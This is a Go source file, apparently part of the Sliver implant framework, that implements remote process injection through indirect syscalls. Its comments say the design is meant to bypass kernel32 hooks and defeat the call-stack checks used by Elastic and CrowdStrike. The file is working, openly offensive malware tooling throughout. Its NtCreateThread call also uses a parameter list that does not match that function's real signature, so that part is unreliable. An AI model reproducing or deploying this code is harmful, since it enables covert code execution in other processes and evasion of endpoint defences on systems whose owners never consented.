package evasion

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// NT injection primitives — remote process injection executed entirely via
// indirect syscalls (NtAllocateVirtualMemory / NtWriteVirtualMemory /
// NtProtectVirtualMemory / NtCreateThread), bypassing kernel32-level hooks
// (VirtualAllocEx, WriteProcessMemory, VirtualProtectEx, CreateRemoteThread).
//
// Every Nt* call is dispatched through IndirectSyscall(): the syscall
// instruction executes from a clean `syscall; ret` gadget inside ntdll's
// .text, so the origin of the syscall is ntdll itself instead of an
// unbacked module — defeating call-stack provenance checks (Elastic
// `native_api_call_from_unsigned_module`, CrowdStrike stack analysis).
//
// Design notes (frank):
//   - Thread creation uses the legacy NtCreateThread (6 args). NtCreateThreadEx
//     takes 10 args; syscall.Syscall6 can only place 6 (4 registers + 2 stack
//     slots) and the remaining stack params would land on the Go runtime's
//     saved-register area — silent frame corruption. NtCreateThread remains
//     exported and functional on every Windows release including 11 24H2.
//   - IndirectSyscall itself allocates a tiny RW stub page via Win32
//     VirtualAlloc per call (then flips to RX, executes, frees). This keeps
//     no persistent executable private memory, at the cost of one benign
//     VirtualAlloc(RW) per syscall — far less suspicious than the
//     VirtualAllocEx-remote + CreateRemoteThread chain it replaces.
//   - SSN entries are resolved once (sync.Once) and reused. HalosGate
//     handles hooked stubs during resolution.

import (
	"errors"
	"fmt"
	"sync"
	"unsafe"

	//{{if .Config.Debug}}
	"log"
	//{{end}}

	"golang.org/x/sys/windows"
)

// ntAllocType / protections mirror the Win32 flags used by injectTask.
const (
	memCommit  = 0x1000
	memReserve = 0x2000

	pageReadWrite   = 0x04
	pageExecRead    = 0x20
	pageExecRW      = 0x40
	threadAllAccess = 0x1FFFFF
)

// ntSyscallEntry couples an SSN with the ntdll gadget address.
type ntSyscallEntry struct {
	SSN    uint16
	Gadget uintptr
}

var (
	ntOnce      sync.Once
	ntEntries   map[string]*ntSyscallEntry
	ntInitErr   error
	ntFuncNames = []string{
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtProtectVirtualMemory",
		"NtCreateThread",
	}
)

// ntInit resolves and caches all Nt* SSNs used by the injection chain.
func ntInit() error {
	ntOnce.Do(func() {
		ntEntries = make(map[string]*ntSyscallEntry, len(ntFuncNames))
		for _, name := range ntFuncNames {
			entry, err := ResolveSyscall(name)
			if err != nil {
				ntInitErr = fmt.Errorf("NT injection init: %s: %w", name, err)
				return
			}
			ntEntries[name] = &ntSyscallEntry{SSN: entry.SSN, Gadget: entry.GadgetAddr}
			//{{if .Config.Debug}}
			log.Printf("[NTInject] resolved %s: SSN=%d gadget=0x%x\n", name, entry.SSN, entry.GadgetAddr)
			//{{end}}
		}
	})
	return ntInitErr
}

// ntCall runs a cached Nt* syscall indirectly.
func ntCall(name string, args ...uintptr) error {
	entry, ok := ntEntries[name]
	if !ok {
		return errors.New("NT syscall not cached: " + name)
	}
	return IndirectSyscall(entry.SSN, entry.Gadget, args...)
}

// NtAllocateVirtualMemoryRemote allocates memory in a target process.
// Returns the base address of the new region.
func NtAllocateVirtualMemoryRemote(processHandle windows.Handle, size uintptr, protection uint32) (uintptr, error) {
	if err := ntInit(); err != nil {
		return 0, err
	}
	var (
		base       uintptr // NULL → kernel picks the base
		regionSize = size
	)
	// NtAllocateVirtualMemory(ProcessHandle, BaseAddress*, ZeroBits,
	//                         RegionSize*, AllocationType, Protect)
	// ZeroBits MUST be present (0) — omitting it shifts RegionSize*/Type/Protect
	// one slot left and the kernel dereferences AllocationType (0x3000) as a
	// RegionSize pointer → NTSTATUS 0xC0000005.
	err := ntCall("NtAllocateVirtualMemory",
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&base)),
		0, // ZeroBits
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(memCommit|memReserve),
		uintptr(protection),
	)
	if err != nil {
		return 0, err
	}
	return base, nil
}

// NtWriteVirtualMemoryRemote writes a buffer into a target process.
// Returns the number of bytes written.
func NtWriteVirtualMemoryRemote(processHandle windows.Handle, base uintptr, data []byte) (uintptr, error) {
	if err := ntInit(); err != nil {
		return 0, err
	}
	if len(data) == 0 {
		return 0, errors.New("NtWriteVirtualMemory: empty buffer")
	}
	var written uintptr
	err := ntCall("NtWriteVirtualMemory",
		uintptr(processHandle),
		base,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)
	if err != nil {
		return 0, err
	}
	return written, nil
}

// NtProtectVirtualMemoryRemote changes page protection in a target process.
// base and size are adjusted (page-aligned) by the kernel — pass by reference.
func NtProtectVirtualMemoryRemote(processHandle windows.Handle, base uintptr, size uintptr, protection uint32) error {
	if err := ntInit(); err != nil {
		return err
	}
	var oldProtect uint32
	return ntCall("NtProtectVirtualMemory",
		uintptr(processHandle),
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&size)),
		uintptr(protection),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
}

// NtCreateThreadRemote spawns a thread at startAddr in a target process.
// Returns the new thread handle (owned by the caller — close when done).
func NtCreateThreadRemote(processHandle windows.Handle, startAddr uintptr) (windows.Handle, error) {
	if err := ntInit(); err != nil {
		return 0, err
	}
	var threadHandle uintptr
	err := ntCall("NtCreateThread",
		uintptr(unsafe.Pointer(&threadHandle)), // param 1: PHANDLE
		uintptr(threadAllAccess),               // param 2: DesiredAccess
		0,                                      // param 3: ObjectAttributes (NULL)
		uintptr(processHandle),                 // param 4: ProcessHandle
		startAddr,                              // param 5: StartRoutine
		0,                                      // param 6: Argument (NULL)
	)
	if err != nil {
		return 0, err
	}
	if threadHandle == 0 {
		return 0, errors.New("NtCreateThread returned NULL handle")
	}
	return windows.Handle(threadHandle), nil
}

// NTInjectTask is the indirect-syscall equivalent of taskrunner.injectTask:
// alloc (RW) → write → protect (RX) → thread, without touching a single
// kernel32 export. Callers should fall back to the classic Win32 path when
// this returns an error.
func NTInjectTask(processHandle windows.Handle, data []byte, rwxPages bool) (windows.Handle, error) {
	var (
		remoteAddr   uintptr
		threadHandle windows.Handle
	)

	//{{if .Config.Debug}}
	log.Printf("[NTInject] injecting %d bytes (rwx=%v) via indirect syscalls\n", len(data), rwxPages)
	//{{end}}

	// 1. Allocate
	allocProt := uint32(pageReadWrite)
	if rwxPages {
		allocProt = pageExecRW
	}
	remoteAddr, err := NtAllocateVirtualMemoryRemote(processHandle, uintptr(len(data)), allocProt)
	if err != nil {
		return 0, fmt.Errorf("NtAllocateVirtualMemory: %w", err)
	}

	// 2. Write
	if _, err := NtWriteVirtualMemoryRemote(processHandle, remoteAddr, data); err != nil {
		return 0, fmt.Errorf("NtWriteVirtualMemory: %w", err)
	}

	// 3. Flip RW → RX (classic hygiene; skipped for RWX builds)
	if !rwxPages {
		if err := NtProtectVirtualMemoryRemote(processHandle, remoteAddr, uintptr(len(data)), pageExecRead); err != nil {
			return 0, fmt.Errorf("NtProtectVirtualMemory: %w", err)
		}
	}

	// 4. Thread
	threadHandle, err = NtCreateThreadRemote(processHandle, remoteAddr)
	if err != nil {
		return 0, fmt.Errorf("NtCreateThread: %w", err)
	}

	//{{if .Config.Debug}}
	log.Printf("[NTInject] thread created (handle=0x%x) at 0x%x\n", threadHandle, remoteAddr)
	//{{end}}

	return threadHandle, nil
}
